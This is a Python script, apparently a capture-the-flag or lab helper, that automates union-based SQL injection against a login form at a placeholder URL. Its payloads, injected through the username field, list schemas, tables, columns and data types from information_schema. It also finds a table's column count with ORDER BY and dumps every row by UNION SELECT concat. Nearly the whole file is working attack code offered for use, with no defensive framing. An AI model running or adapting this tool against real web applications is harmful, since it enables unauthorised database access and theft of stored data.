import requests

# Function to send request and check response
def req_fun(user,pas):
    response = requests.post("http://aa.com",data={'user':user,'pass':pas,'submit':'Log In'})
    if 'Incorrect' in response.text:
        return 0
    elif 'valid' in response.text:
        return 0
    elif 'Hello' in response.text:
        t1 = '<h2>Hello'
        t2 = '</h2>'  
        return (response.text[response.text.find(t1)+len(t1):response.text.rfind(t2)])
    else:
        return 0

# Extracting list of tables with columns and its data type (Union based)(If access to information schema) 
def list_tables():
    tables = []
    p1 = "' union (select TABLE_SCHEMA from information_schema.COLUMNS where TABLE_SCHEMA not in ('performance_schema','mysql','sys','information_schema') limit 1 offset "
    p2 = "' union (select TABLE_NAME from information_schema.COLUMNS where TABLE_SCHEMA not in ('performance_schema','mysql','sys','information_schema') limit 1 offset "
    p3 = "' union (select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA not in ('performance_schema','mysql','sys','information_schema') limit 1 offset "
    p4 = "' union (select DATA_TYPE from information_schema.COLUMNS where TABLE_SCHEMA not in ('performance_schema','mysql','sys','information_schema') limit 1 offset "

    while_condition=1
    count=0
    while while_condition == 1:
        response = req_fun(f"{p1} {count}) -- ",'1')
    
        if response:
            response2 = req_fun(f"{p2} {count}) -- ",'1')
            response3 = req_fun(f"{p3} {count}) -- ",'1')
            response4 = req_fun(f"{p4} {count}) -- ",'1')
            tables.append((response,response2,response3,response4))
            count+=1
        else:
            while_condition = 0

    for i in range(len(tables)):
        print(tables[i])

# Extract data from table without information schema (but the table name should be known)
def extract_table(table_name):
    # Finding no. of columns (order by method)
    while_condition = 1
    count = 1
    str = ''
    str2 = ''
    while while_condition == 1:
        response = req_fun(f"' union (select 1 from (select * from {table_name} order by {count}) as bla) -- ",'1')
        str+= f'{count},'
        str2+= f"`{count}`,'--',"
        if response:
            count+=1
        else:
            count-=1
            str = str[:-3]
            str2 = str2[:-15]
            while_condition = 0
    print(f"No. of columns : {count}")
    
    # Extracting data
    data = []
    while_condition = 1
    count = 0
    while while_condition == 1:
        response = req_fun(f"' union (select concat({str2}) from (select {str} union select * from {table_name} ) as bla limit 1 offset {count} ) -- ",'1')
        if response:
            count+=1
            data.append(response)
        else:
            while_condition = 0

    for i in range(len(data)):
        print(data[i])

# Main
print("1. List tables\n2. Extract data from table by table name")
inp = input("Enter option : ")
match inp:
    case '1':
        list_tables()
    case '2':
        inp2 = input("Enter table name : ")
        extract_table(inp2)
    case _:
        print("Invalid input")
        exit(-1)
